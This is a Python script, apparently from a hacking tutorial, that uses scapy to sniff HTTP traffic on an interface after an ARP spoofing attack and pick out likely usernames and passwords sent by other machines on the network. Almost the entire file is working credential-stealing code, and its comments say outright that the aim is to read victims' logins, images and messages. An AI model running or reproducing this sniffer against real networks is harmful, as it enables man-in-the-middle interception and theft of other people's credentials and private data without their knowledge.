# ARP Spoofing runs an attack which allow hacker to redirect the flow packets in the network 
# and place the hacker in the middle of the connection between any client or the network and 
# the router.This means that anything that the client sent or receive will go through hackers 
# machine allowing them to see all the passwords, all the usernames, all the images & messages 
# that they send and receive.

# Right now we have a program(arp_spoof.py) that will put us in the middle of the connection 
# but we still don't know how to read this information.This information is flowing through our 
# computer.But right now we're still not reading this information and we have no way of reading 
# this information.These informations flow as packets.In order to read this information we'll 
# need a packet sniffer.The idea of the packet sniffer is it's basically a program that reads 
# packets or data that flow through an interface.So, we'll be able to read the usernames and 
# passwords entered by a remote computer that is connected to the same network.

#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http # This is used for doing filtration on our packets. For install it just run 'pip install scapy_http'.

def sniff(interface): #This 'interface' argument will be the interface that we will be sniffing
                      # or capturing data from.
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet) #The argument called 'store' basically tells scapy not to store 
                                        # packets in memory so that it doesn't cause too much pressure on our computer.So we set it to 'False'.
                                        # The last argument is 'prn' which allows us to specify a callback function. This function that will be 
                                        # called every time scapy.sniff function captures a packet. So for each packet that we capture this will 
                                        # execute another function for us called 'process_sniffed_packet'.

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def get_login_info(packet):
    if packet.haslayer(scapy.Raw): # Scapy.Raw is the layer which contains the username, password and other infos that we give while login into a website 
        #print(packet[scapy.Raw].load) # Here we are printing the 'load' field of the 'scapy.Raw' layer for only getting username & password
        load = packet[scapy.Raw].load
        keywords = ["username","user","login", "email","password"]
        for keyword in keywords:
            if keyword in load: # If websites use load field to send useless info, we wll not print them unless it contains any of the keywords.
                return load

def process_sniffed_packet(packet): # This 'packet' argument is the packet that we received or snipped.We can filter this packet, we can modify it.
    #print(packet)
    if packet.haslayer(http.HTTPRequest): # We are checking if our packet has a http layer and the layer that we're asking has http request or not.
                                          # The reason for this is because all images, videos or passwords meaning pretty much everything while using 
                                          # a web browser is sent using the HTTP layer.
        url = get_url(packet) # This is the url of the site that will be visit
        print("[+] HTTP Request >> " + str(url))

        login_info = get_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password >> " + str(login_info) + "\n\n")

sniff("eth0") # Here, I have call my sniff function and I give it my interface which is 'eth0'.Now I'm using it because this is the interface that 
              # is connected to the Internet that I'm targeting.If you're targeting a Wi-Fi network and you have an interface called LAN 0 then that's 
              # the one that you should use.